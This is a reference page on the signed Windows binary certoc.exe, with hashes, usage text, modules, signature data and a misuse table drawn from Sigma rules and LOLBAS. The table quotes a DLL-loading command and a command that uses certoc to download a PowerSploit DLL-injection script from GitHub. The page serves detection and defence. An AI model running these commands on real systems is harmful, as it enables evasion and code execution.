---
title: certoc.exe | CertOC.exe
excerpt: What is certoc.exe?
---

# certoc.exe 

* File Path: `C:\Windows\system32\certoc.exe`
* Description: CertOC.exe

## Hashes

Type | Hash
-- | --
MD5 | `D75A554FDA8443AA0CC236D2768F7F21`
SHA1 | `FD0717D291A287DA36553B43AB3E661C1FC657DB`
SHA256 | `DEBC4F3E7B3D7AA72763170660EC9382021935E675F3BAA5E1A585B3C94FCD73`
SHA384 | `2E43462033B1146E00E715CD0AB2C7694BD06FE3521792D2EF66571DA797A86F29D51A22F1D0BB67A0E03C1AB2307ACD`
SHA512 | `5642E65A389B89A98A615D3AC868CAE7CC4CE211193F0C8DDDB380772A32512ECA414FE31FB332A36F2A32A5210C4DAE51CF13B623FD5C5C4228A46CC81862D0`
SSDEEP | `1536:eicU1pleiOsnoGqfEOF11f1mPgKCftrUtWD0i4c1B2T6TvnF9cWT8YlrDbMtLR3s:Af0otsOFJmuftYWD0ix8rtLFifaYkM`
IMP | `964F0F5F0131DAC0DAD3E441F0CC521B`
PESHA1 | `3A06C5DEB3AF4FCF83BED0DD5999AC293DEDE7C4`
PE256 | `E724BA5AE14BBF5CBE71B1B0CDCB638985C2F125B49061CCDC92FCF9C0238453`

## Runtime Data

### Usage (stdout):
```cmhg
Missing command

Usage:
  certoc -GetCACaps URL
  certoc -SCEP [-User] URL
  certoc -store [-User] StoreName [CertId]
  certoc -addstore [-User] StoreName file
  certoc -delstore [-User] StoreName CertId [SaveFile.sst]
  certoc -viewstore [-User] StoreName
  certoc -ImportPFX [-User] [-p password] StoreName file
  certoc -ExportPFX [-User] [-p password] StoreName CertId file
  certoc -ImportPFXToProvider [-User] [-p password] file [Provider [ContainerPrefix [ImportPFXFlags]]]
  certoc -Pulse {Pregen,PregenDelay,PregenOOBE,AIKEnroll}
  certoc -CredUI [-User] [-Modal] StoreName [CertId]
  certoc -LoadDll ModuleName
  certoc -AddTestEKCert
  certoc -EKCert

The parameter is incorrect. 0x80070057 (WIN32: 87 ERROR_INVALID_PARAMETER)

```

### Loaded Modules:

Path |
-- |
C:\Windows\System32\bcrypt.dll |
C:\Windows\System32\bcryptPrimitives.dll |
C:\Windows\system32\certoc.exe |
C:\Windows\System32\clbcatq.dll |
C:\Windows\System32\combase.dll |
C:\Windows\System32\CRYPT32.dll |
C:\Windows\System32\cryptsp.dll |
C:\Windows\System32\kernel.appcore.dll |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\System32\MSASN1.dll |
C:\Windows\System32\msvcp_win.dll |
C:\Windows\System32\msvcrt.dll |
C:\Windows\system32\ncrypt.dll |
C:\Windows\system32\NTASN1.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\OLEAUT32.dll |
C:\Windows\System32\RPCRT4.dll |
C:\Windows\System32\shcore.dll |
C:\Windows\System32\ucrtbase.dll |


## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: CertOC.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/73
* VirusTotal Link: https://www.virustotal.com/gui/file/debc4f3e7b3d7aa72763170660ec9382021935e675f3baa5e1a585b3c94fcd73/detection/


## Possible Misuse

*The following table contains possible examples of `certoc.exe` being misused. While `certoc.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_certoc_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_certoc_execution.yml) | `title: Suspicious Load DLL via CertOC.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_certoc_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_certoc_execution.yml) | `description: Detects when a user installs certificates by using CertOC.exe to loads the target DLL file.`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [process_creation_certoc_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/process_creation_certoc_execution.yml) | `Image\|endswith: '\certoc.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `Name: CertOC.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- Command: certoc.exe -LoadDLL "C:\test\calc.dll"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- Command: certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- Path: c:\windows\system32\certoc.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- Path: c:\windows\syswow64\certoc.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- IOC: Unsigned DLL load via certoc.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certoc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml) | `- IOC: Network connection via certoc.exe`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


